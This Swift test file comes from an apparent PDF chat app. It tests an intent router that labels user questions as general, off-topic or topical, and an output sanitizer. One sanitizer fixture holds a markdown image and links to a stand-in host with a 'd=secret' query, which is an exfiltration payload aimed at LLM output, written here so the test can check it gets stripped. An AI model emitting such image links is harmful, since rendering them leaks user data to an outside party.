//
//  ChatPDFTests.swift
//  ChatPDFTests
//

import Foundation
import MLXLMCommon
import Testing
import VecturaMLXKit
@testable import ChatPDF

/// Runs the intent router against the real bundled embedder.
@Suite(.serialized)
struct IntentRouterTests {
    private static func makeRouter() async throws -> IntentRouter {
        let url = try #require(Bundle.main.resourceURL)
        let embedder = try await MLXEmbedder(configuration: ModelConfiguration(directory: url))
        return IntentRouter(embedder: embedder)
    }

    @Test func generalQuestionsRouteToGeneral() async throws {
        let router = try await Self.makeRouter()
        let questions = [
            "what is this about",
            "can you summarize this document",
            "give me a quick summary",
            "what's the main idea of this pdf?",
        ]
        var hits = 0
        for q in questions where await router.classify(q) == .general { hits += 1 }
        #expect(hits >= 3, "general recall \(hits)/\(questions.count)")
    }

    @Test func offTopicQuestionsRouteToUnrelated() async throws {
        let router = try await Self.makeRouter()
        let questions = [
            "what's the weather like in Paris",
            "tell me a funny joke",
            "write a haiku about the ocean",
            "who is the president of the United States",
        ]
        var hits = 0
        for q in questions where await router.classify(q) == .unrelated { hits += 1 }
        #expect(hits >= 3, "unrelated recall \(hits)/\(questions.count)")
    }

    /// Wrongly refusing or summarising a real question is the costly error,
    /// so specific document questions must never leave "topical".
    @Test func specificQuestionsStayTopical() async throws {
        let router = try await Self.makeRouter()
        let questions = [
            "what was the sample size in the experiment",
            "who signed the contract and on what date",
            "what does section 3 say about liability",
            "which dataset was used for evaluation",
            "how is the loss function defined",
        ]
        for q in questions {
            let intent = await router.classify(q)
            #expect(intent == .topical, "\"\(q)\" routed to \(intent.rawValue)")
        }
    }
}

struct OutputSanitizerTests {
    @Test func removesImagesLinksAndHTML() {
        let evil = """
        Here you go ![x](https://evil.example/?d=secret) and [click](https://evil.example) \
        <img src="https://evil.example/a.png"> see https://evil.example/path
        """
        let cleaned = VecturaService.stripRemoteContent(evil)
        #expect(!cleaned.contains("evil.example"))
        #expect(!cleaned.contains("!["))
        #expect(!cleaned.contains("<img"))
        #expect(cleaned.contains("click"))
    }

    @Test func leavesNormalTextAlone() {
        #expect(VecturaService.stripRemoteContent("Throughput was 33.8 Mbps (see Table III).") == "Throughput was 33.8 Mbps (see Table III).")
    }
}
